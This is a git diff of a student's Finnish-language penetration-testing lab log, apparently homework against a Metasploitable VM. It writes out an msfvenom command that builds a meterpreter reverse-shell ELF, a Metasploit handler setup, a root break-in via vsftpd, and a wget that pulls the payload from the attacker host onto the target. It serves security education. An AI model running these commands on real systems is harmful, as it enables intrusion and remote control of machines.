@@ -195,11 +195,26 @@ Onnistui ekalla. Salasana oli abc123.
 
 Aloitin tehtävän, mutta koneeni jumittui kesken kaiken ja raportoimani kohdatkin hävisivät sitten kuin tuhka tuuleen. Jatkan tätä huomenna, sillä kello on kohta jo 1 yöllä.
 
-Jatkoa 21.11.2024 9:50.
+Jatkoa 21.11.2024 9:50. Kalin irrotin netistä.
 
 Aloitin komennolla ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``, joka löytyi [MSFVenom CheatSheetistä](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom#common-params-when-creating-a-shellcode). Sillä loin haittaohjelman. Sitten avasin msfconsolen ja etsin multi/handler-työkalun ja määritin LHOST, LPORT ja payloadin. Sitten run -> päällä. 
 
 ![image](https://github.com/user-attachments/assets/0d2a6461-5218-4b31-a1ea-0159ef59c868)
+
+Päätin hyödyntää aiemmassa tehtävässä käyttämääni taktiikkaa haittaohjelman siirtämiseksi Metasploitablelle. Siirsin haittaohjelmatiedoston Apache-palvelimelle.
+
+![image](https://github.com/user-attachments/assets/c1a25e8e-e2bf-4686-932c-fa4efe901aba)
+
+Sitten tunkeuduin Metasploitable-koneelle vsftpd-portin kautta. Pääsin rootiin.
+
+![image](https://github.com/user-attachments/assets/744167c5-cc3c-4333-8867-e1ea783d730b)
+
+Käynnistin Kalilla Apache-palvelimen ``sudo systemctl start apache2`` ja latasin palvelimelta tiedoston Metasploitablelle ``wget http://192.168.56.101/reverse.elf``. Onnistui.
+
+
+![image](https://github.com/user-attachments/assets/a2483c66-3843-45b0-b8c3-6f6ed22f97fd)
+
+
 
 
 
